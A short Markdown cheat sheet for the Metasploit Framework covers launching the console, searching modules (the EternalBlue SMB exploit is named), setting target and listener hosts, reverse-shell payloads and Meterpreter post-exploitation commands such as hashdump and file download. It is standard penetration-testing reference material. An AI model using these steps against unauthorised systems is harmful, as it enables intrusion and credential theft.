# 💣 Metasploit Cheat Sheet

**Metasploit Framework** is a powerful tool for developing and executing exploit code against remote target machines.

---

## 🚀 Starting Metasploit

```bash
msfconsole         # Launch the Metasploit Framework console
msfupdate          # Update Metasploit
```

---

## 🔍 Search Modules

```bash
search <keyword>              # Search for exploits, payloads, etc.
info <module_path>            # Get detailed info about a module
```

Example:
```bash
search type:exploit name:smb
info exploit/windows/smb/ms17_010_eternalblue
```

---

## 📦 Using a Module

```bash
use exploit/path/module       # Load an exploit module
set RHOST <target_ip>         # Set target host
set RPORT <target_port>       # Set target port (if needed)
set PAYLOAD <payload_type>    # Set the payload
set LHOST <your_ip>           # Set listener IP
set LPORT <your_port>         # Set listener port
run                           # Run the exploit
```

---

## 📡 Payload Examples

| Payload | Description |
|---------|-------------|
| `windows/meterpreter/reverse_tcp` | Reverse shell via TCP |
| `windows/shell/reverse_http` | Reverse shell via HTTP |
| `linux/x86/meterpreter/reverse_tcp` | Meterpreter for Linux |

---

## 🛠️ Useful Commands (Post Exploitation)

Inside a Meterpreter session:

```bash
sysinfo           # Get system info
getuid            # Get user ID
ps                # List processes
shell             # Drop into shell
screenshot        # Capture screenshot
download <file>   # Download a file
upload <file>     # Upload a file
hashdump          # Dump SAM hashes
```

---

## 🕵️‍♀️ Database & Workspace

```bash
db_status         # Check if database is connected
workspace -a <name>   # Create a new workspace
hosts             # List hosts in database
services          # List discovered services
```

---

## 📌 Tips

- Always check `show options` and `show advanced`
- Use `exploit -j` to run in background job
- Combine with `Nmap` scans using `db_import`
- Many `post/` modules exist for privilege escalation and persistence

---

📁 [Back to Tools Index](./README.md) | 🔗 [Metasploit Unleashed](https://metasploit.help.rapid7.com/)
